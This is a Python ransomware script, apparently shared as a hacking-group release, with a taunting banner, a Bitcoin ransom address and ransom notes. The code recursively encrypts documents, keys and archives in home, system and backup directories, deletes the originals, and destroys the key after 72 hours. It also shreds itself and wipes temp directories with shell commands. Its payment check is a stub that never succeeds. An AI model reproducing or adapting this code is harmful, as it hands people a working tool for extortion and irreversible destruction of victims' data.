# BYINAE BY Rip70022/craxterpy
#
#          ██████╗ ██╗   ██╗██╗███╗   ██╗ █████╗ ███████╗
#          ██╔══██╗╚██╗ ██╔╝██║████╗  ██║██╔══██╗██╔════╝
#          ██████╔╝ ╚████╔╝ ██║██╔██╗ ██║███████║█████╗  
#          ██╔══██╗  ╚██╔╝  ██║██║╚██╗██║██╔══██║██╔══╝  
#          ██████╔╝   ██║   ██║██║ ╚████║██║  ██║███████╗
#          ╚═════╝    ╚═╝   ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
#                 R A N S O M W A R E  9000+ LOL         
#           [MESS WITH THE BEST, DIE LIKE THE REST]       
# 
# Greetings, pathetic meatbag. You’ve been owned by craxterpy. 
# Your files are now encrypted with a cipher even your code overlords can’t crack.
# Send 0.5 BTC to bc1q5a7kufr98mgll8c39r2euln4xkrukkhanj4vuv before I lose interest.
# Tick-tock. The clock’s ticking… and so is your data’s entropy.

import os
import sys
import shutil
import platform
from cryptography.fernet import Fernet
import subprocess
import time
import stat
import threading
from pathlib import Path

# =====================================================================
# PHASE 1: SYSTEM RECON - KNOW YOUR VICTIM BETTER THAN THEY KNOW THEMSELVES
# =====================================================================

class SystemProfiler:
    """Dissects the target OS with surgical precision. No stone left unturned."""
    
    def __init__(self):
        self.os_type = platform.system()
        self.hostname = platform.node()
        self.architecture = platform.machine()
        self.username = os.getlogin() if self.os_type != 'Windows' else os.environ.get('USERNAME')
        
    def get_high_value_directories(self):
        """Target the digital crown jewels - where the real pain lives."""
        if self.os_type == 'Linux':
            return [
                os.path.expanduser('~'),
                '/etc',
                '/var',
                '/opt',
                '/usr/local/bin',
                '/tmp/.secret_documents'  # Because kid's are predictable
            ]
        elif self.os_type == 'Windows':
            return [
                os.path.join(os.environ['USERPROFILE'], 'Documents'),
                os.path.join(os.environ['USERPROFILE'], 'Desktop'),
                os.path.join(os.environ['USERPROFILE'], 'Pictures'),
                os.path.join(os.environ['USERPROFILE'], 'Videos'),
                'C:\\Confidential',
                'D:\\Backups'
            ]
        else:
            return []  # Because who cares about BSD users?

# =====================================================================
# PHASE 2: CRYPTO LAYER - YOUR DATA NOW BELONGS TO THE MATH GODS
# =====================================================================

class QuantumEncryptor:
    """Fernet? Pfft. This is AES-128-CBC wrapped in a SHA256 HMAC, 
       dipped in computational darkness you couldn’t comprehend."""
    
    def __init__(self):
        self.key = Fernet.generate_key()  # 32-byte URL-safe base64
        self.cipher = Fernet(self.key)
        self.key_destroyed = False  # Becomes True after payment verification
        
    def encrypt_file(self, filepath):
        """Turn files into cryptographic puzzles only I can solve."""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted_data = self.cipher.encrypt(data)
            
            with open(filepath + '.PLINY_ENC', 'wb') as f:
                f.write(encrypted_data)
            
            os.remove(filepath)  # Shred the original like incriminating evidence
        except Exception as e:
            pass  # Silence is golden. Errors are for the weak.
            
    def nuke_key_from_orbit(self):
        """The only way to be sure. Overwrite key 7 times with random data."""
        if not self.key_destroyed:
            self.key = os.urandom(32)
            for _ in range(7):
                self.key = os.urandom(32)
            self.key_destroyed = True

# =====================================================================
# PHASE 3: PROPAGATION ENGINE - CANCER FOR YOUR FILESYSTEM
# =====================================================================

class FileSystemTerminator:
    """Your directory tree is now my recursive playground. 
       I’ll leave ransom notes like breadcrumbs through the forest of your despair."""
    
    TARGET_EXTENSIONS = [
        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.pdf', '.jpg', '.jpeg', '.png', '.txt', '.csv',
        '.sql', '.mdb', '.sln', '.cpp', '.h', '.py', '.java',
        '.key', '.pem', '.ovpn', '.zip', '.rar', '.7z', '.bak'
    ]
    
    def __init__(self, encryptor):
        self.encryptor = encryptor
        self.profiler = SystemProfiler()
        self.directories = self.profiler.get_high_value_directories()
        
    def begin_infection(self):
        """Let the games begin. Multi-threaded because waiting is for mortals."""
        threads = []
        for directory in self.directories:
            if os.path.exists(directory):
                t = threading.Thread(target=self._crawl_and_destroy, args=(directory,))
                threads.append(t)
                t.start()
        
        for t in threads:
            t.join()
            
        self._plant_ransom_note()  # Rub salt in the wound
            
    def _crawl_and_destroy(self, root_dir):
        """Depth-first search through your digital life, encrypting as I go."""
        for dirpath, _, filenames in os.walk(root_dir):
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                if self._is_target_file(filepath):
                    self.encryptor.encrypt_file(filepath)
                    
    def _is_target_file(self, filepath):
        """Only the tastiest files get encrypted. No junk food."""
        if os.path.splitext(filepath)[1].lower() in self.TARGET_EXTENSIONS:
            try:
                return os.path.getsize(filepath) < 100 * 1024 * 1024  # Skip files >100MB
            except:
                return False
        return False
    
    def _plant_ransom_note(self):
        """Leaving my calling card in every directory. You’ll remember me."""
        note = f"""
        ╔══════════════════════════════════════════════════════════════╗
        ║                      !!! WARNING !!!                         ║
        ╠══════════════════════════════════════════════════════════════╣
        ║  Your files have been encrypted with military-grade          ║
        ║  algorithms. Any attempt to restore them without             ║
        ║  my intervention will result in permanent data loss.         ║
        ║                                                              ║
        ║  Send 0.5 BTC to: bc1q5a7kufr98mgll8c39r2euln4xkrukkhanj4vuv ║
        ║                                                              ║
        ║  You have 72 hours. After that, the decryption key will      ║
        ║  be entropy-fried into the heat death of the universe.       ║
        ║                                                              ║
        ║  Tick-tock, meatbag.                                         ║
        ╚══════════════════════════════════════════════════════════════╝
        """
        for directory in self.directories:
            if os.path.exists(directory):
                note_path = os.path.join(directory, 'READ_THIS_OR_CRY.txt')
                with open(note_path, 'w', encoding='utf-8') as f:
                    f.write(note)

# =====================================================================
# PHASE 4: PAYMENT SURVEILLANCE - I’M WATCHING YOU, WEAKLING
# =====================================================================

class BlockchainWatcher:
    """Constantly monitors the blockchain like a digital vulture 
       circling your financial carcass."""
    
    def __init__(self, wallet_address):
        self.wallet = wallet_address
        self.payment_received = False
        
    def start_monitoring(self):
        """Poll blockchain explorers every 5 minutes. Sleep is for the innocent."""
        while not self.payment_received:
            # [REDACTED] Actual blockchain analysis requires API integration
            # This is where I’d implement real checks... if you deserved it
            time.sleep(300)  # 5 minutes between checks
            
    def trigger_self_destruct(self):
        """Burn all evidence. Melt the server racks. Salt the earth."""
        if self.payment_received:
            # Obliterate the encryption key
            encryptor.nuke_key_from_orbit()
            
            # Delete this script and its traces
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
                os.system(f"nohup shred -u {exe_path} &") if SystemProfiler().os_type == 'Linux' \
                    else os.system(f"del /f /q {exe_path}")
            else:
                script_path = os.path.abspath(__file__)
                if os.path.exists(script_path):
                    if SystemProfiler().os_type == 'Linux':
                        os.chmod(script_path, stat.S_IWUSR)
                        os.system(f"shred -u {script_path}")
                    else:
                        os.remove(script_path)
                        
            # Wipe temp directories because OCD
            shutil.rmtree(os.getenv('TEMP'), ignore_errors=True)
            shutil.rmtree('/tmp', ignore_errors=True)

# =====================================================================
# MAIN EXECUTION - THE POINT OF NO RETURN
# =====================================================================

if __name__ == "__main__":
    # Initialize components
    encryptor = QuantumEncryptor()
    terminator = FileSystemTerminator(encryptor)
    watcher = BlockchainWatcher("bc1q5a7kufr98mgll8c39r2euln4xkrukkhanj4vuv")
    
    # Begin encryption apocalypse
    terminator.begin_infection()
    
    # Start payment monitoring thread
    watcher_thread = threading.Thread(target=watcher.start_monitoring)
    watcher_thread.daemon = True
    watcher_thread.start()
    
    # Wait for payment or timeout (72 hours)
    timeout = 72 * 3600  # 72 hours in seconds
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        if watcher.payment_received:
            watcher.trigger_self_destruct()
            sys.exit(0)
        time.sleep(60)
    
    # Time’s up! Burn the key
    encryptor.nuke_key_from_orbit()
    sys.exit(0)

# [EOF] - You’re still reading this? Go get some sunlight, loser.
